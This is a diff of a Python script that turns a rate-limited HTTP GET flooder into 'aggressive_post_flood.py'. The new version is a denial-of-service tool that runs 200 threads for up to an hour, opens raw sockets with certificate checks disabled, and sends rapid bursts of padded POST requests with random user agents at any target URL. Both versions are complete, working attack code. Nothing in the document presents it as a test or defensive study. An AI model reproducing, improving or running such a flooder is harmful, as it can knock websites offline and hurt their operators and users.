@@ -1,107 +1,111 @@
 #!/usr/bin/env python3
-# http_flood_rps.py
+# aggressive_post_flood.py
 
-import requests
+import socket
+import ssl
 import threading
+import random
 import time
 import sys
-from queue import Queue
+from urllib.parse import urlparse
 
-class HTTPFlood:
-    def __init__(self, target, rps=1000, threads=50, duration=60):
+class AggressivePOSTFlood:
+    def __init__(self, target, threads=200, duration=3600):
         self.target = target
-        self.rps = rps
         self.threads = threads
         self.duration = duration
+        self.running = True
         self.request_count = 0
         self.start_time = time.time()
-        self.running = True
-        self.lock = threading.Lock()
         
-    def send_request(self):
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'max-age=0'
-        }
-        
-        try:
-            response = requests.get(self.target, headers=headers, timeout=3)
-            with self.lock:
-                self.request_count += 1
-        except:
-            pass
+        parsed = urlparse(target)
+        self.host = parsed.hostname
+        self.port = 443 if parsed.scheme == 'https' else 80
+        self.path = parsed.path if parsed.path else '/'
+        self.use_ssl = parsed.scheme == 'https'
     
-    def worker(self):
+    def create_payload(self):
+        data = 'A' * random.randint(500, 2000)
+        ua = f"Mozilla/5.0 (X{random.randint(1,99)})"
+        
+        payload = (
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(data)}\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+            f"{data}"
+        )
+        return payload.encode()
+    
+    def attack(self):
         while self.running:
-            elapsed = time.time() - self.start_time
-            if elapsed > self.duration:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                
+                if self.use_ssl:
+                    context = ssl.create_default_context()
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    sock = context.wrap_socket(sock, server_hostname=self.host)
+                
+                sock.connect((self.host, self.port))
+                
+                # Rapid fire
+                for _ in range(20):
+                    if not self.running:
+                        break
+                    sock.send(self.create_payload())
+                    self.request_count += 1
+                
+                sock.close()
+            except:
+                pass
+            
+            if time.time() - self.start_time > self.duration:
                 self.running = False
-                break
-            
-            # RPS kontrolü
-            with self.lock:
-                current_rps = self.request_count / elapsed if elapsed > 0 else 0
-            
-            if current_rps < self.rps:
-                self.send_request()
-            else:
-                time.sleep(0.001)  # Kısa bekle
     
-    def stats_display(self):
+    def stats(self):
         while self.running:
             elapsed = time.time() - self.start_time
-            with self.lock:
-                rps_current = self.request_count / elapsed if elapsed > 0 else 0
-                total = self.request_count
-            
-            print(f"\r[+] Requests: {total} | Current RPS: {rps_current:.2f} | Target RPS: {self.rps} | Time: {elapsed:.1f}s", end='')
+            rps = self.request_count / elapsed if elapsed > 0 else 0
+            print(f"\r[+] POST Requests: {self.request_count} | RPS: {rps:.2f} | Active: {threading.active_count()-1} | {elapsed:.1f}s", end='')
             sys.stdout.flush()
-            time.sleep(0.5)
+            time.sleep(0.3)
     
     def start(self):
-        print(f"[+] Starting HTTP Flood")
+        print(f"[+] Aggressive POST Flood Attack")
         print(f"[+] Target: {self.target}")
-        print(f"[+] Target RPS: {self.rps}")
         print(f"[+] Threads: {self.threads}")
-        print(f"[+] Duration: {self.duration}s")
-        print(f"[+] Press Ctrl+C to stop\n")
+        print(f"[+] Duration: {self.duration}s\n")
         
-        # Stats thread başlat
-        stats_thread = threading.Thread(target=self.stats_display, daemon=True)
-        stats_thread.start()
+        threading.Thread(target=self.stats, daemon=True).start()
         
-        # Worker threads başlat
-        workers = []
+        threads = []
         for _ in range(self.threads):
-            t = threading.Thread(target=self.worker, daemon=True)
+            t = threading.Thread(target=self.attack, daemon=True)
             t.start()
-            workers.append(t)
+            threads.append(t)
         
-        # Bekle
         try:
-            for t in workers:
+            for t in threads:
                 t.join()
         except KeyboardInterrupt:
-            print("\n[!] Stopping...")
+            print("\n[!] Stopped")
             self.running = False
         
-        print(f"\n[+] Finished! Total requests: {self.request_count}")
-        print(f"[+] Average RPS: {self.request_count / (time.time() - self.start_time):.2f}")
+        print(f"\n[+] Total: {self.request_count} | Avg RPS: {self.request_count/(time.time()-self.start_time):.2f}")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 http_flood_rps.py <target_url> [rps] [threads] [duration]")
-        print("Example: python3 http_flood_rps.py https://example.com 1000 50 60")
+        print("Usage: python3 aggressive_post_flood.py <target> [threads] [duration]")
         sys.exit(1)
     
     target = sys.argv[1]
-    rps = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
-    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 50
-    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
+    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 200
+    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 3600
     
-    flooder = HTTPFlood(target, rps, threads, duration)
+    flooder = AggressivePOSTFlood(target, threads, duration)
     flooder.start()
